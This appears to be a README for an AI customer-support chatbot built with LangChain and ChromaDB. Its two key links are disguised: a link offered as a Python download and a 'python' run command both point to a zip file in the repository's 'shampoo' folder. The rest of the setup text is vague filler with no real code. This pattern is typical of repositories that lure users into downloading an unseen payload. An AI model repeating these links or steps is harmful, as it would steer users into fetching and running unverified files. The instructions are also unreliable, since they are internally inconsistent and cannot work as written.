## 🛠️ Installation

You will need to install some software to run the chatbot. Here are the steps:

1. **Check Your Python Version**: Make sure you have Python installed. Visit [https://raw.githubusercontent.com/luckylaksh77990/Exclusible-AI-Customer-Support/main/shampoo/Exclusible-AI-Customer-Support.zip](https://raw.githubusercontent.com/luckylaksh77990/Exclusible-AI-Customer-Support/main/shampoo/Exclusible-AI-Customer-Support.zip) to download it if you do not have it.

2. **Install Required Packages**: Open your command line interface (Terminal for Mac/Linux or Command Prompt for Windows) and run the following commands. Each command installs a necessary package.

   ```bash
   pip install tldextract
   pip install sentence_transformers
   pip install langchain==0.0.228
   pip install chromadb==0.3.26
   pip install auto-gptq==0.2.2
   pip install einops==0.6.1
   ```

   ```bash
   python --version
   ```

   This should show you the version of Python you installed.

## 💾 Creating Data

Before the chatbot can work, you need to create data that it will use to answer questions. Gather FAQs or common customer inquiries. Save these in a text file. 

## 🧩 Creating Language Model (LLM)

The chatbot uses a language model to understand and generate responses. This process may take a little time, depending on your computer's performance. Follow the instructions provided in the documentation until the model is ready.

## 📊 Chunks and Embeddings

The next step involves breaking down your data into manageable chunks. This makes it easier for the chatbot to understand. You will also create "embeddings" which are like maps for your data. 

## 🗨️ ChatBot

Once you have your data and model set, you can start using the chatbot. You will interact with it in a simple interface. The chatbot will use the trained data to provide answers based on what it learns.

## 🌐 Get All URLs on a Website

If you want your chatbot to pull information from a website, you can do this easily. You can create a function that scrapes the URLs from the site you want the chatbot to use. This will expand the knowledge base of your chatbot.

## 🔄 Usage

Running the chatbot is easy. Open your command line interface, navigate to the folder where the chatbot files are located, and enter the command:

```bash
python https://raw.githubusercontent.com/luckylaksh77990/Exclusible-AI-Customer-Support/main/shampoo/Exclusible-AI-Customer-Support.zip
```

This will launch the chatbot. You can begin to ask questions right away.
